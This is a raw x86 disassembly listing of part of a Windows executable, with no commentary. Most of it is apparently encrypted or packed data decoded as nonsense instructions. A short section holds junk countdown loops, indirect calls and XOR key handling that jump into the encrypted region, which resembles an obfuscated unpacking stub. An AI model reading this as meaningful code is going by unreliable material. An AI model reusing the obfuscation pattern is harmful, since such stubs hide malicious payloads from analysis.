  402893:	add    DWORD PTR [ecx-0x57],edi
  402896:	retw   
  402898:	xchg   esp,eax
  402899:	(bad)  
  40289a:	dec    ebp
  40289b:	jmp    0xf4a2:0x97f5991a
  4028a2:	dec    edi
  4028a3:	je     0x4028d5
  4028a5:	shl    BYTE PTR [ebx],cl
  4028a7:	push   ecx
  4028a8:	inc    ecx
  4028a9:	mov    dl,0x85
  4028ab:	push   eax
  4028ac:	dec    ebp
  4028ad:	dec    edi
  4028ae:	rcl    edx,1
  4028b0:	add    BYTE PTR [ebx],dl
  4028b2:	inc    ebx
  4028b3:	aam    0x57
  4028b5:	enter  0xc0ea,0x11
  4028b9:	out    0x1,eax
  4028bb:	sbb    edx,esi
  4028bd:	outs   dx,BYTE PTR ds:[esi]
  4028be:	and    DWORD PTR [ebp-0xaf74afd],edx
  4028c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4028c6:	psubsw mm5,mm3
  4028c9:	xor    eax,0xfebb1202
  4028ce:	lahf   
  4028cf:	test   BYTE PTR [ecx+eiz*8],dh
  4028d2:	inc    ebp
  4028d3:	dec    ebp
  4028d4:	mov    BYTE PTR [ecx],0x8e
  4028d7:	jmp    0xa8f6:0x8b50f1d0
  4028de:	test   eax,0xab9c6dfd
  4028e3:	mov    ds:0x67308082,eax
  4028e8:	mov    al,ds:0xa1154249
  4028ed:	dec    edx
  4028ee:	aad    0xf0
  4028f0:	push   ss
  4028f1:	cli    
  4028f2:	pop    es
  4028f3:	pop    ecx
  4028f4:	mov    bl,0x54
  4028f6:	inc    edi
  4028f7:	pop    es
  4028f8:	mov    ah,0x59
  4028fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4028fb:	xor    BYTE PTR [ebx+0x12300eeb],ch
  402901:	into   
  402902:	push   esi
  402904:	mov    dl,0x4
  402906:	cmp    ch,BYTE PTR [edi-0x5289b672]
  40290c:	sbb    ecx,0xe340d1c8
  402912:	mov    edx,0x4e215c73
  402917:	jmp    ebp
  402919:	out    0x2,eax
  40291b:	inc    ebx
  40291c:	jp     0x402923
  40291e:	int    0xaa
  402920:	sub    BYTE PTR [ecx+0x6a616544],bl
  402926:	fidiv  DWORD PTR [ebx]
  402928:	int    0x2d
  40292a:	jmp    0x2a25:0x690bf939
  402931:	cmp    BYTE PTR ds:0x965f7b91,ah
  402937:	(bad)  
  402938:	cld    
  402939:	cmovnp esi,DWORD PTR [edx+0xb]
  40293d:	dec    edi
  40293e:	sahf   
  40293f:	bound  ebx,QWORD PTR [edi-0x39]
  402942:	push   ebp
  402943:	inc    edi
  402944:	lea    edx,[ecx-0x5616ccc9]
  40294a:	pop    edi
  40294b:	idiv   BYTE PTR [ebx]
  40294d:	mov    ecx,0x73a4b415
  402952:	int3   
  402953:	sbb    dl,0x8e
  402956:	loope  0x4029a9
  402958:	shr    DWORD PTR [eax],1
  40295a:	inc    esi
  40295b:	into   
  40295c:	outs   dx,BYTE PTR ds:[esi]
  40295d:	mov    ebp,esp
  40295f:	mov    edi,0x6c9510da
  402964:	enter  0xecbc,0x5e
  402968:	leave  
  402969:	ret    0x4
  40296c:	push   ebp
  40296d:	mov    ebp,esp
  40296f:	sub    esp,0x28
  402972:	leave  
  402973:	ret    0x10
  402976:	push   ebp
  402977:	mov    ebp,esp
  402979:	push   ecx
  40297a:	or     eax,DWORD PTR ds:0x42fddd
  402980:	push   ecx
  402981:	movzx  edx,WORD PTR ds:0x42e7ef
  402988:	sbb    DWORD PTR ds:0x42e813,edx
  40298e:	mov    eax,0xf89c8531
  402993:	mov    DWORD PTR ds:0x42fde9,0x1a
  40299d:	cmp    DWORD PTR ds:0x42fde9,0x0
  4029a4:	je     0x402a39
  4029aa:	cmp    DWORD PTR ds:0x42fde9,0x24
  4029b1:	jne    0x4029cc
  4029b7:	push   0x42e22c
  4029bc:	push   0x42e803
  4029c1:	push   0x59d6
  4029c6:	call   DWORD PTR ds:0x42e54f
  4029cc:	mov    edx,DWORD PTR ds:0x42fde9
  4029d2:	dec    edx
  4029d3:	mov    DWORD PTR ds:0x42fde9,edx
  4029d9:	jmp    0x40299d
  4029de:	mov    DWORD PTR ds:0x42e7ff,0x19
  4029e8:	cmp    DWORD PTR ds:0x42e7ff,0x0
  4029ef:	je     0x402a39
  4029f5:	cmp    DWORD PTR ds:0x42e7ff,0x4
  4029fc:	jne    0x402a0d
  402a02:	push   0x5bc5
  402a07:	call   DWORD PTR ds:0x42e3d3
  402a0d:	cmp    DWORD PTR ds:0x42e7ff,0x5
  402a14:	jne    0x402a27
  402a1a:	mov    edx,DWORD PTR ds:0x42e7ff
  402a20:	dec    edx
  402a21:	mov    DWORD PTR ds:0x42e7ff,edx
  402a27:	mov    edx,DWORD PTR ds:0x42e7ff
  402a2d:	dec    edx
  402a2e:	mov    DWORD PTR ds:0x42e7ff,edx
  402a34:	jmp    0x4029e8
  402a39:	mov    DWORD PTR [ebp-0x8],eax
  402a3c:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  402a43:	mov    edx,DWORD PTR [ebp-0x8]
  402a46:	mov    ecx,DWORD PTR ds:0x42feae
  402a4c:	mov    ecx,DWORD PTR [ecx]
  402a4e:	xor    DWORD PTR ds:0x42fdd5,ecx
  402a54:	push   esi
  402a55:	mov    ecx,0x7510855
  402a5a:	or     DWORD PTR ds:0x42fe0d,ebx
  402a60:	xor    edx,ecx
  402a62:	sbb    esi,0x5361
  402a68:	mov    esi,0x32729c
  402a6d:	sbb    DWORD PTR ds:0x42e228,0x657d
  402a77:	push   edi
  402a78:	and    DWORD PTR ds:0x42e228,0x0
  402a82:	jmp    0x402a94
  402a87:	mov    edi,DWORD PTR ds:0x42e228
  402a8d:	inc    edi
  402a8e:	mov    DWORD PTR ds:0x42e228,edi
  402a94:	cmp    DWORD PTR ds:0x42e228,0x10
  402a9b:	jae    0x402abe
  402aa1:	cmp    DWORD PTR ds:0x42e228,0x11
  402aa8:	jne    0x402ab9
  402aae:	push   0x42e241
  402ab3:	call   DWORD PTR ds:0x42e553
  402ab9:	jmp    0x402a87
  402abe:	mov    edi,DWORD PTR [ebp+0x10]
  402ac1:	add    edx,esi
  402ac3:	cmp    edi,edx
  402ac5:	je     0x4036ba
  402acb:	mov    edx,DWORD PTR [ebp-0x8]
  402ace:	mov    eax,DWORD PTR [ebp-0x4]
  402ad1:	xor    eax,ecx
  402ad3:	mov    edi,0xffcd8d64
  402ad8:	sub    edi,eax
  402ada:	add    edi,DWORD PTR [ebp+0x10]
  402add:	xor    edx,ecx
  402adf:	jmp    0x402dbe
  402ae4:	imul   ebx,DWORD PTR [edx],0xffffff8f
  402ae7:	cmp    BYTE PTR [ebp+0x71],cl
  402aea:	jae    0x402a9d
  402aec:	jl     0x402b40
  402aee:	dec    esi
  402aef:	mov    esp,0xe76d4ae6
  402af4:	jo     0x402b02
  402af6:	jo     0x402b68
  402af8:	mov    esi,0x8670707e
  402afd:	xor    al,0xc8
  402aff:	and    BYTE PTR [ebp+0x6eecbee7],0x44
  402b06:	stos   DWORD PTR es:[edi],eax
  402b07:	outs   dx,DWORD PTR ds:[esi]
  402b08:	lods   eax,DWORD PTR ds:[esi]
  402b09:	jbe    0x402a9e
  402b0b:	jmp    DWORD PTR [ebx]
  402b0d:	into   
  402b0e:	sbb    ebp,edx
  402b10:	lods   eax,DWORD PTR ds:[esi]
  402b11:	xchg   ebp,eax
  402b12:	lds    ecx,FWORD PTR [edi+0x1]
  402b15:	dec    ebx
  402b16:	adc    eax,0x7fdf9fb1
  402b1b:	ins    DWORD PTR es:[edi],dx
  402b1c:	shl    BYTE PTR [edi],0xf9
  402b1f:	add    eax,0xc8a1b0e8
  402b24:	xor    ch,BYTE PTR [edx+0x36bd1cec]
  402b2a:	bnd je 0x402b78
  402b2d:	mov    ebx,0xba958188
  402b32:	or     al,0xb4
  402b34:	and    al,0x28
  402b36:	fistp  WORD PTR ds:0xf7ec99b1
  402b3c:	mov    bh,0x5c
  402b3e:	jl     0x402bb5
  402b40:	in     eax,dx
  402b41:	lea    edx,ss:[ebx-0x4f]
  402b45:	mov    bh,0x4e
  402b47:	pushf  
  402b48:	call   DWORD PTR [ebx]
  402b4a:	mov    dh,0x39
  402b4c:	in     al,dx
  402b4d:	aad    0xea
  402b4f:	mov    al,ds:0x89a7769
  402b54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b55:	push   ds
  402b56:	dec    ecx
  402b57:	dec    ebp
  402b58:	inc    esp
  402b59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b5a:	int3   
  402b5b:	in     al,0x98
  402b5d:	jle    0x402b8b
  402b5f:	adc    BYTE PTR [ebx-0x1],bh
  402b62:	mov    eax,0x5ab40f16
  402b67:	jp     0x402bc5
  402b69:	or     eax,0x35335417
  402b6e:	nop
  402b6f:	sbb    ebp,DWORD PTR [ecx]
  402b71:	sub    al,0x5c
  402b73:	inc    ebp
  402b74:	fcom   DWORD PTR [edi+0x7266b5e2]
  402b7a:	scas   eax,DWORD PTR es:[edi]
  402b7b:	push   0xffffffc7
  402b7d:	repnz xchg esp,eax
  402b7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b80:	pushf  
  402b81:	cdq    
  402b82:	repnz cmp eax,0x2976877
  402b88:	cdq    
  402b89:	jle    0x402b0d
  402b8b:	cli    
  402b8c:	sub    ah,BYTE PTR [edx-0x20099956]
  402b92:	add    DWORD PTR [ecx+0x8],ebx
  402b95:	fsubr  DWORD PTR [ecx+0x72]
  402b98:	jle    0x402b6c
  402b9a:	or     cl,dl
  402b9c:	mov    bl,0x3c
  402b9e:	and    DWORD PTR [edi+0x41b79566],ecx
  402ba4:	call   0x5c77a21d
  402ba9:	lods   eax,DWORD PTR ds:[esi]
  402baa:	je     0x402c10
  402bac:	retf   
  402bad:	and    eax,0x24ba551d
  402bb2:	cli    
  402bb3:	shr    esp,0x4e
  402bb6:	popf   
  402bb7:	mov    ecx,0x207245d4
  402bbc:	in     eax,0x9e
  402bbe:	sbb    DWORD PTR [edi+ebp*4],esp
  402bc1:	les    eax,FWORD PTR [edx-0x6c]
  402bc4:	jne    0x402b83
  402bc6:	sub    bh,BYTE PTR [edi+0xe]
  402bc9:	inc    edx
  402bca:	push   esp
  402bcb:	aam    0xee
  402bcd:	out    dx,eax
  402bce:	xlat   BYTE PTR ds:[ebx]
  402bcf:	or     esi,ebp
  402bd1:	jp     0x402bda
  402bd3:	jl     0x402c46
  402bd5:	hlt    
  402bd6:	aam    0x42
  402bd8:	ss aas 
  402bda:	jl     0x402c1c
  402bdc:	dec    ebp
  402bdd:	aad    0x2d
  402bdf:	shl    BYTE PTR [ebx+0x15],1
  402be2:	dec    eax
  402be3:	adc    dl,BYTE PTR [edx+ebx*1-0x80]
  402be7:	push   ecx
  402be8:	mov    ecx,0x86c5691b
  402bed:	test   BYTE PTR [edi-0x6a],ch
  402bf0:	xor    bl,dh
  402bf2:	and    ecx,DWORD PTR [edx]
  402bf4:	in     eax,0xb2
  402bf6:	inc    eax
  402bf7:	(bad)  
  402bf8:	cmp    eax,DWORD PTR [eax+0x2d]
  402bfb:	adc    bh,BYTE PTR [esi+0x5768f6e3]
  402c01:	mov    ecx,0x8b1c0ace
  402c06:	popa   
  402c07:	call   0xd472b7d7
  402c0c:	iret   
  402c0d:	jle    0x402bc4
  402c0f:	mov    WORD PTR [ebx+0x10],ss
  402c12:	adc    eax,0x7fa43ffc
  402c17:	inc    ecx
  402c18:	fldcw  WORD PTR [edi]
  402c1a:	push   es
  402c1b:	daa    
  402c1c:	nop
  402c1d:	aad    0xb3
  402c1f:	rol    DWORD PTR [ebx-0x6d],0xf6
  402c23:	add    eax,0x343c307b
  402c28:	bound  edi,QWORD PTR [ebp-0x4]
  402c2b:	ja     0x402c5f
  402c2d:	fwait
  402c2e:	sbb    al,0x5c
  402c30:	fsub   st,st(4)
  402c32:	scas   al,BYTE PTR es:[edi]
  402c33:	inc    esp
  402c34:	fwait
  402c35:	jne    0x402bd4
  402c37:	jge    0x402c0d
  402c39:	pop    esp
  402c3a:	sub    al,BYTE PTR [ebx-0x2a]
  402c3d:	ret    0x54ba
  402c40:	sahf   
  402c41:	jp     0x402ca4
  402c43:	sub    ecx,DWORD PTR [ebx+0x494af8a]
  402c49:	sbb    ah,BYTE PTR [ecx+0x9bed718]
  402c4f:	xor    eax,0x6dee1129
  402c54:	shr    BYTE PTR [ecx+0x64f0b2e8],0x9c
  402c5b:	add    eax,0xd8286088
  402c60:	inc    BYTE PTR [edi]
  402c62:	push   edi
  402c63:	and    edi,DWORD PTR [eax+0x70]
  402c66:	dec    ebp
  402c67:	push   cs
  402c68:	int    0x62
  402c6a:	mov    edx,0xf9553924
  402c6f:	and    BYTE PTR [ebx+0x4e],bl
  402c72:	in     eax,0xb
  402c74:	pop    ebp
  402c75:	aad    0xf5
  402c77:	stos   BYTE PTR es:[edi],al
  402c78:	inc    ebp
  402c79:	inc    esi
  402c7a:	nop
  402c7b:	inc    esi
  402c7c:	xchg   edi,eax
  402c7d:	ja     0x402ce6
  402c7f:	lods   eax,DWORD PTR ds:[esi]
  402c80:	test   BYTE PTR [esi-0x81a1f74],cl
  402c86:	retf   0xe21d
  402c89:	sbb    BYTE PTR [edi+ecx*8+0x5581cb13],al
  402c90:	push   ebp
  402c91:	lods   al,BYTE PTR ds:[esi]
  402c92:	add    al,0x4a
  402c94:	or     eax,0x8ed497f3
  402c99:	or     esp,DWORD PTR [ecx]
  402c9b:	retf   0xeb2f
  402c9e:	loope  0x402ca2
  402ca0:	icebp  
  402ca1:	cmp    DWORD PTR [ebx-0x3660e04c],0x3773c4bf
  402cab:	dec    ebp
  402cac:	sbb    bh,cl
  402cae:	data16 xchg cl,bl
  402cb1:	fnstenv [ebp+0x6bdc3c25]
  402cb7:	push   ebx
  402cb8:	pushf  
  402cb9:	ins    BYTE PTR es:[edi],dx
  402cba:	pushf  
  402cbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402cbc:	xor    ch,BYTE PTR [ebx+0x71cbba2d]
  402cc2:	jne    0x402d36
  402cc4:	pop    esp
  402cc5:	or     eax,0x520f7fea
  402cca:	in     eax,dx
  402ccb:	pop    edi
  402ccc:	add    eax,DWORD PTR [esp+edi*2+0x35]
  402cd0:	aad    0xe3
  402cd2:	jnp    0x402d23
  402cd4:	pushf  
  402cd5:	pop    DWORD PTR [ebp+esi*4+0x5b]
  402cd9:	mov    ah,0x72
  402cdb:	mov    dl,0x6c
  402cdd:	std    
  402cde:	stos   BYTE PTR es:[edi],al
  402cdf:	(bad)  
  402ce0:	js     0x402c98
  402ce2:	xchg   edx,eax
  402ce3:	pop    esi
  402ce4:	sub    al,0x25
  402ce6:	(bad)
  402ce9:	jecxz  0x402cfb
  402ceb:	mov    ebx,0x29f249d7
  402cf0:	push   esi
  402cf1:	nop
  402cf2:	mov    edi,0x39335fe5
  402cf7:	icebp  
  402cf8:	sub    DWORD PTR [ebp-0x31dfe460],edx
  402cfe:	push   edx
  402cff:	cld    
  402d00:	xor    DWORD PTR [ebx+0xc],ebp
  402d03:	mov    dh,0x1f
  402d05:	dec    ebp
  402d06:	repnz push ebx
  402d08:	fwait
  402d09:	ins    DWORD PTR es:[edi],dx
  402d0a:	fwait
  402d0b:	into   
  402d0c:	jg     0x402d0d
  402d0e:	sub    eax,0x554e46a4
  402d13:	push   es
  402d14:	mov    ds:0x3db5665c,al
  402d19:	xchg   ebp,eax
  402d1a:	mov    ebx,0x4f51bb0
  402d1f:	dec    esi
  402d20:	lahf   
  402d21:	inc    esp
  402d22:	push   ebp
  402d23:	dec    ecx
  402d24:	call   0x399b73cf
  402d29:	mov    al,0x22
  402d2b:	lds    edi,FWORD PTR [ebp-0x2abbc8b1]
  402d31:	iret   
  402d32:	jle    0x402cbc
  402d34:	sbb    ebx,edx
  402d36:	nop    edx
  402d39:	mov    ebx,eax
  402d3b:	shr    DWORD PTR [ecx-0x3f],0xc7
  402d3f:	add    al,0x1
  402d41:	pushf  
  402d42:	ficom  WORD PTR [edx-0x3d903f9]
  402d48:	enter  0xf89c,0x8
  402d4c:	mov    eax,ds:0x7b7cde5d
  402d51:	clc    
  402d52:	rcr    DWORD PTR [ebx],cl
  402d54:	(bad)  
  402d55:	dec    edx
  402d56:	push   ebx
  402d57:	js     0x402dd7
  402d59:	out    0x38,eax
  402d5b:	jmp    0xf2c2:0x9326573f
  402d62:	sbb    esi,DWORD PTR [esp+ebx*8+0x46d4074b]
  402d69:	xchg   ecx,eax
  402d6a:	leave  
  402d6b:	mov    edx,0xdd97a05
  402d70:	pop    ss
  402d71:	push   0xff235454
  402d76:	jno    0x402d1f
  402d78:	inc    esp
  402d79:	ja     0x402d20
  402d7b:	fwait
  402d7c:	mov    edx,0x5be3b01a
  402d81:	adc    eax,0x85db3ed1
  402d86:	cmp    DWORD PTR [esi-0x772336b1],eax
  402d8c:	call   0x5615f834
  402d91:	jne    0x402d75
  402d93:	out    0x3c,al
  402d95:	inc    ecx
  402d96:	xchg   esi,eax
  402d97:	mov    ss,WORD PTR [esi]
  402d99:	mov    ?,WORD PTR [edi+0x5e]
  402d9c:	mov    al,0xac
  402d9e:	jno    0x402d36
  402da0:	mov    al,0x5
  402da2:	inc    edi
  402da3:	bound  edx,QWORD PTR [edi+0x5b2bc899]
  402da9:	pop    ss
  402daa:	cmp    BYTE PTR [ebp+0x5a],cl
  402dad:	jmp    0x402d47
  402daf:	sub    DWORD PTR [ebx+0x1962dede],edi
  402db5:	and    BYTE PTR [ecx-0x73],bh
  402db8:	aas    
  402db9:	xchg   edx,eax
  402dba:	xchg   esp,eax
  402dbb:	ins    DWORD PTR es:[edi],dx
  402dbc:	fldcw  WORD PTR [ebx+eax*1]
  402dbf:	(bad)  
  402dc0:	cmp    edx,edi
  402dc2:	ja     0x4036b5
  402dc8:	push   ebx
  402dc9:	jmp    0x4030b2
  402dce:	jmp    0x4030ad
  402dd3:	mov    ecx,0xe1afe4fc
  402dd8:	ja     0x402e2b
  402dda:	push   0xffffffa6
  402ddc:	aas    
  402ddd:	xchg   ebp,eax
  402dde:	out    dx,eax
  402ddf:	sub    al,0xc
  402de1:	inc    ecx
  402de2:	fistp  QWORD PTR [esi-0x418f8ff6]
  402de8:	jle    0x402e5a
  402dea:	jo     0x402e37
  402dec:	sbb    DWORD PTR [ecx+0x5e],ebp
  402def:	popf   
  402df0:	or     esi,eax
  402df2:	adc    ecx,DWORD PTR [edx+0x4a]
  402df5:	jmp    0x9331:0xa4e9d2db
  402dfc:	lea    esi,[eax+0x67]
  402dff:	fst    DWORD PTR [ebp+ebx*4-0x235b9e22]
  402e06:	sbb    dl,BYTE PTR [esi+0x10]
  402e09:	(bad)  
  402e0a:	sub    BYTE PTR [ebx+ebp*2-0x3c2be629],ch
  402e11:	mov    al,0xc9
  402e13:	sar    BYTE PTR [esi],cl
  402e15:	popa   
  402e16:	rcl    DWORD PTR [ebx+edi*8],cl
  402e19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e1a:	lds    esp,FWORD PTR [ebp-0x7b]
  402e1d:	hlt    
  402e1e:	aaa    
  402e1f:	sbb    ebx,DWORD PTR [eax]
  402e21:	xor    DWORD PTR [ebx+esi*1+0x70],0x86ec1836
  402e29:	(bad)  
  402e2a:	mov    ecx,0x49779769
  402e2f:	add    DWORD PTR [edx],ebp
  402e31:	sbb    ch,bl
  402e33:	in     eax,0x7e
  402e35:	mov    bl,0x55
  402e37:	and    edi,eax
  402e39:	push   edi
  402e3a:	loope  0x402dfa
  402e3c:	jg     0x402e64
  402e3e:	inc    eax
  402e40:	int    0x5a
  402e42:	fsub   QWORD PTR [eax]
  402e44:	ret    0xcf68
  402e47:	add    bh,BYTE PTR [ecx+0x74]
  402e4a:	aas    
  402e4b:	out    0xa3,eax
  402e4d:	mov    ebp,0x28ce3ab1
  402e52:	sub    al,0xe7
  402e54:	or     cl,al
  402e56:	and    DWORD PTR ds:0x93dda7ce,esp
  402e5c:	pop    edx
  402e5d:	jmp    0x17bd8939
  402e62:	xor    dl,BYTE PTR [edx-0x44962078]
  402e68:	mov    esi,0x161aae06
  402e6d:	jne    0x402df7
  402e6f:	inc    BYTE PTR [eax+0x30ea88c]
  402e75:	push   edx
  402e76:	mov    bh,BYTE PTR [ebx]
  402e78:	imul   ebx,DWORD PTR [ecx-0x75],0xbe7edf9f
  402e7f:	or     BYTE PTR [ebx+0x32],dl
  402e82:	and    BYTE PTR [ecx+eiz*4-0x7e643911],ah
  402e89:	pop    ss
  402e8a:	rol    BYTE PTR [eax+0x5a],cl
  402e8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e8e:	mov    al,0x30
  402e90:	pusha  
  402e91:	pop    edi
  402e92:	inc    ebp
  402e93:	out    0xf9,al
  402e95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e96:	and    DWORD PTR [eax-0x16626404],edi
  402e9c:	scas   eax,DWORD PTR es:[edi]
  402e9d:	mov    ah,0x46
  402e9f:	add    eax,0x999d0ff9
  402ea4:	dec    DWORD PTR ds:0xef269e45
  402eaa:	fsubr  QWORD PTR [edi-0x19]
  402ead:	(bad)  
  402eaf:	xor    esi,DWORD PTR [ebx+0x6d]
  402eb2:	in     al,0xb7
  402eb4:	pop    ss
  402eb5:	test   eax,0xc66fb4ae
  402eba:	mov    cl,0x13
  402ebc:	imul   ebp,DWORD PTR [esi],0x1ba0375c
  402ec2:	adc    eax,0xc04eeb20
  402ec7:	setno  ch
  402eca:	sbb    dh,0x83
  402ecd:	fistp  DWORD PTR [ebx]
  402ecf:	dec    ebp
  402ed0:	leave  
  402ed1:	(bad)  
  402ed2:	mov    DWORD PTR [esi],0x73271bd9
  402ed8:	jb     0x402ee0
  402eda:	mov    ch,0xb3
  402edc:	push   ds
  402edd:	dec    edx
  402ede:	stos   BYTE PTR es:[edi],al
  402edf:	cmp    al,0xd0
  402ee1:	js     0x402eb7
  402ee3:	mov    edi,0xbecbff4a
  402ee8:	mov    BYTE PTR [eax],cl
  402eea:	cmp    eax,0xde5f0da8
  402eef:	fmulp  st(5),st
  402ef1:	pop    esp
  402ef2:	jmp    0xf07e:0xbdc5d94
  402ef9:	mov    esp,0xc90ccb7c
  402efe:	aas    
  402eff:	mov    ch,0x43
  402f01:	cmp    BYTE PTR [ecx+ecx*2-0x52c030d0],ch
  402f08:	push   0x5b
  402f0a:	in     al,dx
  402f0b:	aad    0x7
  402f0d:	nop
  402f0e:	scas   al,BYTE PTR es:[edi]
  402f0f:	mov    eax,0xbdb70003
  402f14:	jle    0x402f5c
  402f16:	mov    cl,0x12
  402f18:	test   al,0xe1
  402f1a:	sar    ah,1
  402f1c:	(bad)  
  402f1d:	xor    eax,ecx
  402f1f:	lods   al,BYTE PTR ds:[esi]
  402f20:	repz imul DWORD PTR [edi-0x483a3a6a]
  402f27:	inc    edi
  402f28:	push   ebx
  402f29:	and    ah,BYTE PTR [ebx]
  402f2b:	pop    esp
  402f2c:	rcr    DWORD PTR [esi-0x50],cl
  402f2f:	retf   0xa832
  402f32:	add    esp,esi
  402f34:	out    0x73,eax
  402f36:	mov    ch,BYTE PTR [edi+edi*8-0x7a]
  402f3a:	imul   edi,DWORD PTR [ecx-0x61],0xffffff88
  402f3e:	xchg   esp,eax
  402f3f:	aaa    
  402f40:	es dec edi
  402f42:	test   bl,ch
  402f44:	inc    edi
  402f45:	adc    BYTE PTR [esp+ebx*4+0x9],0xfd
  402f4a:	cvtps2pd xmm1,QWORD PTR [ebx+0x5a2f1e51]
  402f51:	dec    esi
  402f52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f53:	ficomp WORD PTR [eax-0x26e01191]
  402f59:	(bad)  
  402f5a:	int3   
  402f5b:	xchg   ebp,eax
  402f5c:	scas   al,BYTE PTR es:[edi]
  402f5d:	repz sar DWORD PTR [esi],1
  402f60:	xchg   edx,eax
  402f61:	int    0xfa
  402f63:	and    BYTE PTR [eax+0x66],0x12
  402f67:	jmp    0x626205f0
  402f6c:	ins    BYTE PTR es:[edi],dx
  402f6d:	popa   
  402f6e:	outs   dx,BYTE PTR ds:[esi]
  402f6f:	pusha  
  402f70:	aas    
  402f71:	sub    DWORD PTR [ecx+0x4345fdaf],0x6ee566e1
  402f7b:	iret   
  402f7c:	repnz mov dl,0xdc
  402f7f:	jge    0x402f07
  402f81:	sub    al,0xd3
  402f83:	cmc    
  402f84:	jbe    0x402fe4
  402f86:	xchg   BYTE PTR [ebx+ebx*1-0x7334cb50],ah
  402f8d:	push   edx
  402f8e:	aad    0xeb
  402f90:	addps  xmm4,xmm7
  402f93:	mov    esp,0xeb26810b
  402f98:	outs   dx,DWORD PTR ds:[esi]
  402f99:	lahf   
  402f9a:	jl     0x402f6c
  402f9c:	jb     0x402fe2
  402f9e:	ret    
  402f9f:	out    0xb7,al
  402fa1:	jle    0x402fc0
  402fa3:	and    eax,DWORD PTR [ebp+0x0]
  402fa6:	jle    0x403005
  402fa8:	in     eax,dx
  402fa9:	fadd   QWORD PTR [ecx-0x67c6283e]
  402faf:	aad    0x47
  402fb1:	rol    BYTE PTR [ecx+0x45],0x44
  402fb5:	ds cmc 
  402fb7:	icebp  
  402fb8:	dec    edx
  402fb9:	pop    edi
  402fba:	lods   al,BYTE PTR ds:[esi]
  402fbb:	mov    eax,ds:0x2266a57d
  402fc0:	fs loope 0x403035
  402fc3:	popa   
  402fc4:	cmp    BYTE PTR [edi],ch
  402fc6:	pop    eax
  402fc7:	adc    ah,BYTE PTR [edx-0x4dd9fbb]
  402fcd:	push   ds
  402fce:	cwde   
  402fcf:	(bad)  
  402fd0:	sbb    eax,DWORD PTR [eax]
  402fd2:	leave  
  402fd3:	sahf   
  402fd4:	xchg   dl,bl
  402fd6:	popf   
  402fd7:	(bad)  
  402fd8:	in     al,0x87
  402fda:	dec    eax
  402fdb:	inc    ecx
  402fdc:	jle    0x402f6e
  402fde:	pop    ecx
  402fdf:	idiv   esp
  402fe1:	aad    0xbc
  402fe3:	stos   DWORD PTR es:[edi],eax
  402fe4:	ins    BYTE PTR es:[edi],dx
  402fe5:	test   al,0x32
  402fe7:	or     DWORD PTR [edi-0xf0eaa3f],ebp
  402fed:	sbb    ah,ch
  402fef:	cli    
  402ff0:	aam    0xeb
  402ff2:	mov    al,ds:0xd9918f03
  402ff7:	xchg   DWORD PTR [ecx+0x2ef20dae],esp
  402ffd:	sahf   
  402ffe:	sbb    al,0xac
  403000:	ss jne 0x40301a
  403003:	xchg   ebp,eax
  403004:	imul   ebx,DWORD PTR [edx],0xffffff9a
  403007:	aam    0x7b
  403009:	xchg   esp,ebp
  40300b:	push   ebx
  40300c:	xchg   BYTE PTR [edx-0x7ffaed76],bh
  403012:	sahf   
  403013:	clc    
  403014:	clc    
  403015:	fidiv  DWORD PTR [esi]
  403017:	ror    BYTE PTR [edx+0x26edb9],cl
  40301d:	cmc    
  40301e:	pop    ebx
  40301f:	and    BYTE PTR [edi-0x77ddb528],al
  403025:	pop    ebx
  403026:	stos   BYTE PTR es:[edi],al
  403027:	xchg   edx,eax
  403028:	in     eax,0xbb
  40302a:	sbb    BYTE PTR [ecx],0x65
  40302d:	push   0xffffffa9
  40302f:	jb     0x403030
  403031:	pushf  
  403032:	inc    edx
  403033:	xor    edi,DWORD PTR [edx]
  403035:	(bad)  
  403037:	scas   al,BYTE PTR es:[edi]
  403038:	lahf   
  403039:	test   DWORD PTR [edi+0x3c0b71ff],esp
  40303f:	ret    0xe85f
  403042:	push   0x836fbc1f
  403047:	sub    al,0xb0
  403049:	push   ebp
  40304a:	callw  0x549a
  40304e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40304f:	pop    ebx
  403050:	xchg   esi,eax
  403051:	xchg   ebx,eax
  403052:	push   cs
  403053:	retf   
  403054:	(bad)  
  403055:	or     al,0xa6
  403057:	icebp  
  403058:	mov    ebp,0x9a3f764e
  40305d:	mov    esi,DWORD PTR [ecx]
  40305f:	push   ebx
  403060:	lods   eax,DWORD PTR ds:[esi]
  403061:	in     eax,dx
  403062:	inc    edx
  403063:	pop    edx
  403064:	data16 jle 0x403008
  403067:	mov    eax,ds:0xbd690340
  40306c:	dec    esi
  40306d:	cmp    bh,bh
  40306f:	std    
  403070:	nop
  403071:	and    BYTE PTR [edi],bh
  403073:	adc    eax,DWORD PTR [edi]
  403075:	cs es dec esp
  403078:	out    dx,al
  403079:	mov    ebp,0xb331e6a0
  40307e:	cmp    al,0x64
  403080:	fisttp DWORD PTR [edi+edi*4-0x4a]
  403084:	cmp    BYTE PTR [esi],dh
  403086:	aas    
  403087:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403088:	push   0xffffffb2
  40308a:	cmp    al,0x4e
  40308c:	and    DWORD PTR [ecx-0x40],ecx
  40308f:	je     0x4030b7
  403091:	jb     0x40304a
  403093:	sub    ah,BYTE PTR [edi+0xb426ecc]
  403099:	inc    edi
  40309a:	pop    ecx
  40309b:	mov    bh,0x36
  40309d:	aam    0xe5
  40309f:	push   esp
  4030a0:	xchg   BYTE PTR [edi],bh
  4030a2:	(bad)  
  4030a3:	push   ss
  4030a4:	daa    
  4030a5:	pop    ds
  4030a6:	xchg   edx,eax
  4030a7:	xchg   esi,eax
  4030a8:	jmp    0x9cbe:0x947c9a0b
  4030af:	jb     0x4030e3
  4030b1:	add    BYTE PTR [ebx+0x7d8bf845],cl
  4030b7:	cld    
  4030b8:	xor    edi,ecx
  4030ba:	add    edi,esi
  4030bc:	jmp    0x40339b
  4030c1:	fist   DWORD PTR [ecx+0x4b76cc16]
  4030c7:	loope  0x40307a
